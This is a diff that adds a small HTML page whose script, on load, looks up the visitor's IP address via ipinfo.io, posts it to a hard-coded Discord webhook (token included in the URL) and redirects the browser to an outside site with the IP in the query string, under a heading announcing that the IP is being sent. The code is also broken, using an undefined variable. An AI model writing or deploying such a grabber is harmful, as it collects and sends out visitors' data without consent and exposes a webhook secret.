@@ -1,0 +1,32 @@
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+<script>
+function slack(message) {
+    const url = '[https://discord.com/api/webhooks/969363118075551815/9GwC8zxGM4YrLrDhfh3pHimfa1hnpWQFb6Z8HFvbS-X8D5ZrU6HKpuShd3mu24TZgimL]';
+    const data = {
+        text: message
+    };
+    $.ajax({
+        type: 'POST',
+        url:  url,
+        data: `payload=${JSON.stringify(data)}`
+    });
+}
+
+fetch('https://ipinfo.io?callback')
+  .then(res => res.json())
+  .then(json => console.log(json.ip))
+ 
+$.getJSON('https://ipinfo.io', res => console.log(res.ip))
+ 
+axios.get('https://ipinfo.io').then(res => console.log(res.data.ip))
+slack(res.ip)
+window.location.href = 'http://keiromichi.com/index.php?ip=' + res.ip; 
+</script>
+<style>
+html{
+    color: red;
+    background: black;
+}
+</style>
+<h1 style="color: red;">IPアドレス送信中</h1>
